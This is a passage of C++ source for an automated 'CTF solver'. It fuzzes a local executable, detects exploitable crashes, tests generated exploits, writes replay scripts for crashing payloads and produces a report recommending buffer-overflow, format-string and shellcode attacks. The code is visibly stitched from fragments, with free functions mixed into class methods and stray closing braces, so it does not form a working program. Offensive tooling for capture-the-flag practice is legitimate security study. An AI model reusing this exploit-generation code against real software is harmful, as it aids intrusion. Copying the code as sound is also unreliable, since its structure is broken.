                        result.exploitable = true;
                        result.severity = "HIGH";
                        break;
                    default:
                        result.vuln_type = "Unknown Signal";
                        result.description = "Process terminated by signal " + std::to_string(result.signal_num);
                        result.severity = "MEDIUM";
                }
                
                return true; // Crash detected
            }
        }
    }
    
    return false;
}

// Check if exploit was successful (non-crash success)
bool isSuccessfulExploit(const std::string& output) {
    std::vector<std::string> success_indicators = {
        "successfully", "success", "Success", "SUCCESS",
        "correct", "Correct", "CORRECT",
        "well done", "Well done", "WELL DONE",
        "congratulations", "Congratulations", "CONGRATULATIONS",
        "flag{", "FLAG{", "CTF{",
        "you win", "You win", "YOU WIN",
        "pwned", "Pwned", "PWNED",
        "shell", "Shell", "$",
        "root@", "# "
    };
    
    for (const auto& indicator : success_indicators) {
        if (output.find(indicator) != std::string::npos) {
            return true;
        }
    }
    
    return false;
}

// Enhanced captureOutput with better error handling (update existing one)
std::string captureOutput(const std::string& input) {
    int pipefd[2];
    if (pipe(pipefd) == -1) return "";
    
    int stdout_pipe[2];
    if (pipe(stdout_pipe) == -1) {
        close(pipefd[0]);
        close(pipefd[1]);
        return "";
    }
    
    pid_t pid = fork();
    if (pid == 0) {
        // Child process
        close(pipefd[1]);
        close(stdout_pipe[0]);
        
        dup2(pipefd[0], STDIN_FILENO);
        dup2(stdout_pipe[1], STDOUT_FILENO);
        dup2(stdout_pipe[1], STDERR_FILENO);
        
        close(pipefd[0]);
        close(stdout_pipe[1]);
        
        // Set timeout to prevent hanging
        alarm(5);
        
        execl(target_exe.c_str(), target_exe.c_str(), nullptr);
        _exit(1);
    } else if (pid > 0) {
        // Parent process
        close(pipefd[0]);
        close(stdout_pipe[1]);
        
        // Send input
        if (!input.empty()) {
            ssize_t written = write(pipefd[1], input.c_str(), input.size());
            (void)written; // Suppress unused variable warning
        }
        close(pipefd[1]);
        
        // Read output with timeout
        std::string output;
        char buffer[1024];
        
        fd_set readfds;
        struct timeval timeout;
        timeout.tv_sec = 3;  // 3 second timeout
        timeout.tv_usec = 0;
        
        FD_ZERO(&readfds);
        FD_SET(stdout_pipe[0], &readfds);
        
        while (select(stdout_pipe[0] + 1, &readfds, nullptr, nullptr, &timeout) > 0) {
            ssize_t bytes_read = read(stdout_pipe[0], buffer, sizeof(buffer) - 1);
            if (bytes_read <= 0) break;
            
            buffer[bytes_read] = '\0';
            output += buffer;
            
            // Reset timeout for next read
            timeout.tv_sec = 1;
            timeout.tv_usec = 0;
            FD_ZERO(&readfds);
            FD_SET(stdout_pipe[0], &readfds);
        }
        
        close(stdout_pipe[0]);
        
        int status;
        waitpid(pid, &status, WNOHANG);  // Non-blocking wait
        
        return output;
    }
    
    return "";
}

AdaptiveChallengeClassifier classifier;
AdvancedGDBAnalyzer* gdb_analyzer = nullptr;
ExploitContext exploit_context;

// Enhanced analysis function to add to your class
void performAdaptiveAnalysis() {
    std::cout << "[*] ===== ADAPTIVE CTF ANALYSIS =====" << std::endl;
    
    // Step 1: Deep GDB analysis
    gdb_analyzer = new AdvancedGDBAnalyzer(target_exe);
    exploit_context = gdb_analyzer->performDeepAnalysis();
    
    // Step 2: Classify challenge type
    std::string binary_info = getBinaryAnalysisString();
    std::string runtime_info = getRuntimeBehaviorString();
    std::string gdb_info = getGDBAnalysisString();
    
    auto classifications = classifier.classifyChallenge(binary_info, runtime_info, gdb_info);
    
    std::cout << "[*] Challenge Classifications:" << std::endl;
    for (const auto& classification : classifications) {
        std::cout << "    " << classification.first 
                  << " (confidence: " << std::fixed << std::setprecision(2) 
                  << classification.second << ")" << std::endl;
    }
    
    // Step 3: Generate adaptive exploits
    AdaptiveExploitGenerator generator(exploit_context, target_exe);
    auto adaptive_exploits = generator.generateAdaptiveExploits();
    
    std::cout << "[+] Generated " << adaptive_exploits.size() 
              << " adaptive exploit attempts" << std::endl;
    
    // Step 4: Test exploits
    testAdaptiveExploits(adaptive_exploits);
}
// NEW: Generate solution script
void generateSolutionScript(const std::string& payload) {
    std::string script_filename = "solve_" + std::to_string(std::time(nullptr)) + ".py";
    std::ofstream script(script_filename);
    
    script << "#!/usr/bin/env python3" << std::endl;
    script << "# Auto-generated solution script" << std::endl;
    script << "import subprocess" << std::endl;
    script << "import sys" << std::endl;
    script << std::endl;
    
    script << "def solve():" << std::endl;
    script << "    target = '" << target_exe << "'" << std::endl;
    script << "    payload = b'";
    
    for (unsigned char c : payload) {
        script << "\\x" << std::hex << std::setw(2) << std::setfill('0') << (int)c;
    }
    
    script << "'" << std::endl;
    script << std::endl;
    script << "    print(f'[*] Solving {target}')" << std::endl;
    script << "    print(f'[*] Payload: {payload}')" << std::endl;
    script << "    " << std::endl;
    script << "    proc = subprocess.run([target], input=payload, capture_output=True)" << std::endl;
    script << "    " << std::endl;
    script << "    print('Output:')" << std::endl;
    script << "    print(proc.stdout.decode())" << std::endl;
    script << "    if proc.stderr:" << std::endl;
    script << "        print('Errors:')" << std::endl;
    script << "        print(proc.stderr.decode())" << std::endl;
    script << std::endl;
    script << "if __name__ == '__main__':" << std::endl;
    script << "    solve()" << std::endl;
    
    script.close();
    chmod(script_filename.c_str(), 0755);
    std::cout << "[+] Solution script: " << script_filename << std::endl;
}
    
    // Generate comprehensive CTF report
    void generateCTFReport() {
        std::string report_filename = "ctf_analysis_report.md";
        std::ofstream report(report_filename);
        
        report << "# Advanced CTF Binary Analysis Report\n\n";
        report << "**Target:** " << target_exe << "\n";
        report << "**Analysis Date:** " << getCurrentTimestamp() << "\n\n";
        
        // ELF Analysis Section
        report << "## Binary Analysis\n\n";
        report << "### Architecture & Security Features\n";
        report << "- **Architecture:** " << elf_info.architecture << "\n";
        report << "- **Entry Point:** 0x" << std::hex << elf_info.entry_point << std::dec << "\n";
        report << "- **Stack Canary:** " << (elf_info.has_canary ? "✅ Enabled" : "❌ Disabled") << "\n";
        report << "- **NX Bit:** " << (elf_info.has_nx ? "✅ Enabled" : "❌ Disabled") << "\n";
        report << "- **PIE:** " << (elf_info.has_pie ? "✅ Enabled" : "❌ Disabled") << "\n";
        report << "- **RELRO:** " << (elf_info.has_relro ? "✅ Enabled" : "❌ Disabled") << "\n";
        report << "- **FORTIFY:** " << (elf_info.has_fortify ? "✅ Enabled" : "❌ Disabled") << "\n\n";
        
        if (!elf_info.dangerous_functions.empty()) {
            report << "### Dangerous Functions Detected\n";
            for (const auto& func : elf_info.dangerous_functions) {
                report << "- `" << func << "`";
                if (elf_info.function_addresses.count(func)) {
                    report << " @ 0x" << std::hex << elf_info.function_addresses.at(func) << std::dec;
                }
                report << "\n";
            }
            report << "\n";
        }
        
        // Vulnerability Analysis
        report << "## Vulnerability Analysis\n\n";
        report << "### Summary\n";
        report << "- **Total Test Cases:** " << total_runs << "\n";
        report << "- **Crashes Found:** " << crashes_found << "\n";
        report << "- **Unique Crashes:** " << unique_crashes << "\n";
        report << "- **Exploitable:** " << countExploitable() << "\n\n";
        
        if (!vulnerabilities.empty()) {
            report << "### Detailed Findings\n\n";
            for (size_t i = 0; i < vulnerabilities.size(); i++) {
                const auto& vuln = vulnerabilities[i];
                report << "#### Vulnerability #" << i + 1 << "\n";
                report << "- **Type:** " << vuln.vuln_type << "\n";
                report << "- **Severity:** " << vuln.severity << "\n";
                report << "- **Exploitable:** " << (vuln.exploitable ? "Yes" : "No") << "\n";
                if (vuln.exploitable) {
                    report << "- **Exploit Technique:** " << vuln.exploit_technique << "\n";
                }
                report << "- **Signal:** " << vuln.signal_num << "\n";
                report << "- **Payload Size:** " << vuln.payload_size << " bytes\n";
                report << "- **Description:** " << vuln.description << "\n";
                if (!vuln.crashed_function.empty()) {
                    report << "- **Crashed Function:** " << vuln.crashed_function << "\n";
                }
                report << "\n";
            }
        }
        
        // Attack Recommendations
        report << "## Attack Recommendations\n\n";
        
        if (!elf_info.has_canary) {
            report << "### Buffer Overflow Attack\n";
            report << "No stack canary detected. Consider:\n";
            report << "- Classic stack buffer overflow\n";
            report << "- Return address overwrite\n";
            report << "- ROP/JOP chains if DEP is enabled\n\n";
        }
        
        if (hasPrintfFunctions()) {
            report << "### Format String Attack\n";
            report << "Printf family functions detected. Consider:\n";
            report << "- Memory leak via %p/%x\n";
            report << "- Arbitrary write via %n\n";
            report << "- Stack/heap address disclosure\n\n";
        }
        
        if (!elf_info.has_nx) {
            report << "### Shellcode Injection\n";
            report << "NX bit disabled. Consider:\n";
            report << "- Direct shellcode execution\n";
            report << "- NOP sled + shellcode\n";
            report << "- Egg hunting techniques\n\n";
        }
        
        // CTF-specific recommendations
        report << "## CTF Strategy\n\n";
        report << "### Recommended Approach\n";
        
        int critical_count = 0;
        for (const auto& vuln : vulnerabilities) {
            if (vuln.severity == "CRITICAL") critical_count++;
        }
        
        if (critical_count > 0) {
            report << "1. **High Priority:** " << critical_count << " critical vulnerabilities found\n";
            report << "2. Focus on exploitable buffer overflows for quick wins\n";
            report << "3. Use generated PoCs as starting points\n";
        } else {
            report << "1. Perform manual code review for logic bugs\n";
            report << "2. Test edge cases not covered by fuzzing\n";
            report << "3. Look for race conditions and timing attacks\n";
        }
        
        report << "\n### Tools and Files Generated\n";
        report << "- Vulnerability reports: `vuln_*.txt`\n";
        report << "- Proof of concepts: `poc_*.py`\n";
        report << "- GDB initialization: `.gdbinit_ctf`\n";
        report << "- This report: `" << report_filename << "`\n\n";
        
        report << "---\n";
        report << "*Report generated by Advanced CTF Solver*\n";
        
        report.close();
        
        std::cout << "[+] Comprehensive CTF report saved: " << report_filename << std::endl;
    }
    
    // Get current timestamp
    std::string getCurrentTimestamp() {
        auto now = std::chrono::system_clock::now();
        auto time_t = std::chrono::system_clock::to_time_t(now);
        std::stringstream ss;
        ss << std::put_time(std::localtime(&time_t), "%Y-%m-%d %H:%M:%S");
        return ss.str();
    }
};

// Main function
int main(int argc, char* argv[]) {
    if (argc < 2) {
        std::cout << "Usage: " << argv[0] << " <target_executable> [max_iterations] [--verbose]" << std::endl;
        std::cout << "Example: " << argv[0] << " ./vulnerable_program 5000 --verbose" << std::endl;
        return 1;
    }
    
    std::string target = argv[1];
    int max_iterations = (argc >= 3) ? std::atoi(argv[2]) : 1000;
    bool verbose = (argc >= 4) && (std::string(argv[3]) == "--verbose");
    
    // Check if target exists and is executable
    if (access(target.c_str(), F_OK) != 0) {
        std::cerr << "Error: Target file '" << target << "' does not exist" << std::endl;
        return 1;
    }
    
    if (access(target.c_str(), X_OK) != 0) {
        std::cerr << "Error: Target file '" << target << "' is not executable" << std::endl;
        return 1;
    }
    
    std::cout << "=== Advanced CTF Solver v2.0 ===" << std::endl;
    std::cout << "Target: " << target << std::endl;
    std::cout << "Max iterations: " << max_iterations << std::endl;
    std::cout << "Verbose mode: " << (verbose ? "ON" : "OFF") << std::endl;
    std::cout << std::endl;
    
    try {
        AdvancedCTFSolver solver(target, verbose);
        solver.startAdvancedFuzzing(max_iterations);
    } catch (const std::exception& e) {
        std::cerr << "Error: " << e.what() << std::endl;
        return 1;
    }
    
    return 0;}
}
